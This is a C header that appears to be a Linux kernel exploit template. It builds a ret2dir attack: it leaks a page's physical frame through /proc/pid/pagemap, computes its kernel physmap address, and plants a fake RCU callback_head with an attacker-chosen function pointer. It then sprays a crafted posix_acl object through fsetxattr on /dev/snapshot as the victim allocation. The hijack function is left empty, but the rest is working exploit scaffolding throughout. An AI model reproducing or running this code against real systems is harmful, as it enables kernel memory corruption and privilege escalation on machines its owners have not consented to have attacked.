#ifndef _POSIX_ACL_TMPL_H_
#define _POSIX_ACL_TMPL_H_

#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <memory.h>
#include <unistd.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <sys/socket.h>

#define KMALLOC_SIZE 32
#define RCU_OBJ

// for ret2dir
#define PHYS_OFFSET 0xffff880000000000
#define PFN_MIN 0
#define PAGE_SIZE 0x1000
#define USER_ADDR 0x40000000
#define PAGE_SHIFT 12

struct posix_acl {
	char hole1[0x8];
	char* callback_next;
    char hole3[0x10];
};

struct callback_head {
    void* callback_next;
    void* callback_func;
};

struct posix_acl fake_posix_acl;
struct callback_head fake_callback_head;

unsigned overwrite_start = 0x8;
unsigned overwrite_end = 0x10;

void* victim_obj = (void*)&fake_posix_acl;

uint64_t kaddr = 0x0;
uint64_t r[11] = {
    0xffffffffffffffff, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0};

void do_setup_physmap() {

  syscall(__NR_mmap, 0x20000000, 0x1000000, 3, 0x32, -1, 0);
  long res = 0;
  memcpy((void*)0x20000000, "/dev/snapshot", 14);
  res = syscall(__NR_openat, 0xffffffffffffff9c, 0x20000000, 0x181100, 0);
  if (res != -1)
    r[0] = res;

    void* uaddr = (void*)USER_ADDR;
    void* raddr = NULL;
    void* ret = NULL;
    char file_name[30];
    sprintf(file_name, "/proc/%d/pagemap", getpid());
    int fd = open(file_name, O_RDONLY);
    if (fd < 0) {
        perror("open failed");
        goto err;
    }
    uint64_t v = 0;
    uint64_t pfn = 0;

    munmap(uaddr, PAGE_SIZE);
    raddr = mmap(uaddr, PAGE_SIZE, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANON, -1, 0);
    if(raddr == MAP_FAILED) {
        perror("mmap failed");
        goto err;
    }
    // necessary due to lazy allocation
    memset(raddr, 0, PAGE_SIZE);
    lseek(fd, ((uint64_t)uaddr >> PAGE_SHIFT)*sizeof(uint64_t), SEEK_SET);
    read(fd, &v, sizeof(uint64_t));
    if (v & (1UL << 63)) {
        pfn = v & ((1UL << 55) - 1);
        fprintf(stdout, "pfn: 0x%lx\n", pfn);
        kaddr = PHYS_OFFSET + 0x1000 * (pfn-PFN_MIN);
        fprintf(stdout, "kaddr: 0x%lx\n", kaddr);
        ret = (void*)kaddr;
        memset(&fake_posix_acl, 0x00, sizeof(struct posix_acl));
        fake_posix_acl.callback_next= (void*)kaddr;
        fake_callback_head.callback_next = 0;
        fake_callback_head.callback_func = (void*)0xffffffffdeadbeef;
        memset((void*)USER_ADDR, 0xff, PAGE_SIZE);
        memcpy((void*)USER_ADDR, &fake_callback_head, sizeof(struct callback_head));
    }
    return;
err:
    close(fd);
    exit(-1);
}


void do_alloc_victim() {
  memcpy((void*)0x20000040, "system.posix_acl_default", 25);
  *(uint32_t*)0x20000540 = 2;
  *(uint16_t*)0x20000544 = 1;
  *(uint16_t*)0x20000546 = 1;
  *(uint32_t*)0x20000548 = 0;
  *(uint16_t*)0x2000054c = 2;
  *(uint16_t*)0x2000054e = 1;
  *(uint32_t*)0x20000550 = r[1];
  *(uint16_t*)0x20000554 = 2;
  *(uint16_t*)0x20000556 = 6;
  *(uint32_t*)0x20000558 = r[2];
  *(uint16_t*)0x2000055c = 2;
  *(uint16_t*)0x2000055e = 5;
  *(uint32_t*)0x20000560 = r[3];
  *(uint16_t*)0x20000564 = 2;
  *(uint16_t*)0x20000566 = 4;
  *(uint32_t*)0x20000568 = r[4];
  *(uint16_t*)0x2000056c = 4;
  *(uint16_t*)0x2000056e = 5;
  *(uint32_t*)0x20000570 = 0;
  *(uint16_t*)0x20000574 = 8;
  *(uint16_t*)0x20000576 = 5;
  *(uint32_t*)0x20000578 = r[5];
  *(uint16_t*)0x2000057c = 8;
  *(uint16_t*)0x2000057e = 4;
  *(uint32_t*)0x20000580 = r[6];
  *(uint16_t*)0x20000584 = 8;
  *(uint16_t*)0x20000586 = 7;
  *(uint32_t*)0x20000588 = r[7];
  *(uint16_t*)0x2000058c = 8;
  *(uint16_t*)0x2000058e = 1;
  *(uint32_t*)0x20000590 = r[8];
  *(uint16_t*)0x20000594 = 8;
  *(uint16_t*)0x20000596 = 7;
  *(uint32_t*)0x20000598 = r[9];
  *(uint16_t*)0x2000059c = 8;
  *(uint16_t*)0x2000059e = 2;
  *(uint32_t*)0x200005a0 = r[10];
  *(uint16_t*)0x200005a4 = 0x10;
  *(uint16_t*)0x200005a6 = 0;
  *(uint32_t*)0x200005a8 = 0;
  *(uint16_t*)0x200005ac = 0x20;
  *(uint16_t*)0x200005ae = 4;
  *(uint32_t*)0x200005b0 = 0;
  syscall(__NR_fsetxattr, r[0], 0x20000040, 0x20000540, 0x74, 3);
  //syscall(__NR_fsetxattr, r[0], 0x20000040, 0x20000540, 0x20, 3);
}

void do_hijack() {
}

#endif
